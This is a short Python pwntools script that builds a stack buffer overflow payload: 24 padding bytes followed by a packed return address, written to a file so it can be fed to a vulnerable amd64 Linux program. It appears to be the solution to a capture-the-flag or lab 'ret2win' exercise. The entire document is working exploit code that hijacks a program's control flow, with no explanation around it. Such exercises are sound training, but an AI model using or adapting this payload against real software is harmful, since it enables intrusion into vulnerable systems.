from pwn import *

context(arch='amd64',os='linux')
Address = 0x400626 + 1
payload = b'A' * 24
print(f"payload:{payload}")
payload = payload + p64(Address)

with open('./payload.dat','wb') as f:
    f.write(payload)
    print(f"Payload {payload}written to payload file.")

